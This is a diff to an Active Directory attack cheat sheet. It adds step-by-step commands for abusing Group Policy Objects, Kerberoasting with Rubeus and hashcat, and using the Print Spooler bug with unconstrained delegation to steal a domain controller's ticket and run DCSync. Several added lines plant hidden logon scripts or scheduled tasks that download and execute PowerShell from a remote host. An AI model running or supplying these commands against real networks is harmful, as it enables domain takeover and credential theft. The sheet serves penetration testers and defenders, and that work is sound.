@@ -16,6 +16,11 @@
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
     - [Passwords in SYSVOL & Group Policy Preferences](#passwords-in-sysvol-&-group-policy-preferences)
     - [Exploit Group Policy Objects GPO](#exploit-group-policy-objects-gpo)
+      - [Find vulnerable GPO](#find-vulnerable-gpo)
+      - [Abuse GPO with SharpGPOAbuse](#abuse-gpo-with-sharpgpoabuse)
+      - [Abuse GPO with PowerGPOAbuse](#abuse-gpo-with-powergpoabuse)
+      - [Abuse GPO with pyGPOAbuse](#abuse-gpo-with-pygpoabuse)
+      - [Abuse GPO with PowerView](#abuse-gpo-with-powerview)
     - [Dumping AD Domain Credentials](#dumping-ad-domain-credentials)
       - [Using ndtsutil](#using-ndtsutil)
       - [Using Vshadow](#using-vshadow)
@@ -690,31 +695,68 @@ Get-NetGPOGroup
 
 > Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
 
-:warning: Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: gpupdate /force. 
+GPO are stored in the DC in `\\<domain.dns>\SYSVOL\<domain.dns>\Policies\<GPOName>\`, inside two folders **User** and **Machine**.
+If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at `Machine\Preferences\ScheduledTasks`.
+
+:warning: Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: `gpupdate /force`. 
+
+#### Find vulnerable GPO
+
+Look a GPLink where you have the **Write** right.
+
+```powershell
+Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
+```
+
+#### Abuse GPO with SharpGPOAbuse
 
 ```powershell
 # Build and configure SharpGPOAbuse
-git clone https://github.com/FSecureLABS/SharpGPOAbuse
-Install-Package CommandLineParser -Version 1.9.3.15
-ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll
+$ git clone https://github.com/FSecureLABS/SharpGPOAbuse
+$ Install-Package CommandLineParser -Version 1.9.3.15
+$ ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll
 
 # Adding User Rights
-SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
+.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
 
 # Adding a Local Admin
-SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
 
 # Configuring a User or Computer Logon Script
-SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+.\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
 
 # Configuring a Computer or User Immediate Task
-SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+.\SharpGPOAbuse.exe --AddComputerTask --GPOName "VULNERABLE_GPO" --Author 'LAB.LOCAL\User' --TaskName "EvilTask" --Arguments  "/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND " --Command "cmd.exe" --Force
 ```
 
-Abuse GPO with **pyGPOAbuse**
+#### Abuse GPO with PowerGPOAbuse
+
+* https://github.com/rootSySdk/PowerGPOAbuse
+
+```ps1
+PS> . .\PowerGPOAbuse.ps1
+
+# Adding a localadmin 
+PS> Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
+
+# Assign a new right 
+PS> Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
+
+# Adding a New Computer/User script 
+PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'
+
+# Create an immediate task 
+PS> Add-UserTask/Add-ComputerTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator
+```
+
+
+
+#### Abuse GPO with pyGPOAbuse
 
 ```powershell
-git clone https://github.com/Hackndo/pyGPOAbuse
+$ git clone https://github.com/Hackndo/pyGPOAbuse
+
 # Add john user to local administrators group (Password: H4x00r123..)
 ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
 
@@ -727,7 +769,7 @@ git clone https://github.com/Hackndo/pyGPOAbuse
     -user
 ```
 
-Abuse GPO with **PowerView**
+#### Abuse GPO with PowerView
 
 ```powershell
 # Enumerate GPO
@@ -1137,7 +1179,16 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43c360c29c1
 Alternatively with [Rubeus](https://github.com/GhostPack/Rubeus)
 
 ```powershell
+# Kerberoast (RC4 ticket)
 .\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
+
+# Kerberoast (AES ticket)
+# Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.
+Rubeus.exe kerberoast /tgtdeleg
+
+# Kerberoast (RC4 ticket)
+# The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.
+Rubeus.exe kerberoast /rc4opsec
 ```
 
 Alternatively with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
@@ -1152,12 +1203,20 @@ Alternatively on macOS machine you can use [bifrost](https://github.com/its-a-fe
 ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
 ```
 
-Then crack the ticket with hashcat or john
+
+Then crack the ticket using the correct hashcat mode (`$krb5tgs$23`= `etype 23`) 
+	
+| Mode  | Description  |
+|-------|--------------|
+| 13100 | Kerberos 5 TGS-REP etype 23 (RC4) |
+| 19600 | Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) |
+| 19700 | Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) |
 
 ```powershell
 ./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt
 ./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt
 ```
+
 
 Mitigations: 
 * Have a very long password for your accounts with SPNs (> 32 characters)
@@ -1570,7 +1629,7 @@ This ACE can be abused for an Immediate Scheduled Task attack, or for adding a u
 
 #### ReadLAPSPassword
 
-An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module.
+An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module. Detail of the exploitation can be found in the [Reading LAPS Password](#reading-laps-password) section.
 
 ```powershell
 Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
@@ -1705,16 +1764,22 @@ ls \\machine.domain.local\c$
 
 > The user sends a TGS to access the service, along with their TGT, and then the service can use the user's TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html 
 
+> When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. 
+
 :warning: Unconstrained delegation used to be the only option available in Windows 2000
 
-Domain Compromise via DC Print Server and Unconstrained Delegation
+#### SpoolService Abuse with Unconstrained Delegation
+
+The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.
 
 Prerequisites:
-- Object with Property "Trust this computer for delegation to any service (Kerberos only)"
-- Must have ADS_UF_TRUSTED_FOR_DELEGATION 
-- Must not have ADS_UF_NOT_DELEGATED flag
+- Object with Property **Trust this computer for delegation to any service (Kerberos only)**
+- Must have **ADS_UF_TRUSTED_FOR_DELEGATION** 
+- Must not have **ADS_UF_NOT_DELEGATED** flag
+- User must not be in the **Protected Users** group 
+- User must not have the flag **Account is sensitive and cannot be delegated**
 
-#### Find delegation
+##### Find delegation
 
 Check the `TrustedForDelegation` property.
 
@@ -1730,7 +1795,17 @@ grep TRUSTED_FOR_DELEGATION domain_computers.grep
 
 NOTE: Domain controllers usually have unconstrained delegation enabled
 
-#### Monitor with Rubeus
+
+##### SpoolService status
+
+Check if the spool service is running on the remote host
+
+```powershell
+ls \\dc01\pipe\spoolss
+python rpcdump.py DOMAIN/user:password@10.10.10.10
+```
+
+##### Monitor with Rubeus
 
 Monitor incoming connections from Rubeus.
 
@@ -1738,9 +1813,11 @@ Monitor incoming connections from Rubeus.
 Rubeus.exe monitor /interval:1 
 ```
 
-#### Force a connect back from the DC
+##### Force a connect back from the DC
 
->  SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a "feature" in the MS-RPRN RPC interface 
+Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.
+
+>  SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a "feature" in the MS-RPRN RPC interface.
 
 ```powershell
 # From https://github.com/leechristensen/SpoolSample
@@ -1748,11 +1825,17 @@ Rubeus.exe monitor /interval:1
 .\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB
 # DC01.HACKER.LAB is the domain controller we want to compromise
 # HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.
+
+# From https://github.com/dirkjanm/krbrelayx
+printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME>
+
+# From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689
+python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME>
 ```
 
 If the attack worked you should get a TGT of the domain controller.
 
-#### Load the ticket
+##### Load the ticket
 
 Extract the base64 TGT from Rubeus output and load it to our current session.
 
@@ -1765,7 +1848,7 @@ Alternatively you could also grab the ticket using Mimikatz :  `mimikatz # sekur
 Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HACKER\krbtgt`
 
 
-#### Mitigation
+##### Mitigation
 
 * Ensure sensitive accounts cannot be delegated
 * Disable the Print Spooler Service
@@ -2267,3 +2350,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
 * [CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)
 * [Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory](https://www.hub.trimarcsecurity.com/post/leveraging-the-kerberos-bronze-bit-attack-cve-2020-17049-scenarios-to-compromise-active-directory)
+* [GPO Abuse: "You can't see me" - Huy Kha -  July 19, 2019](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
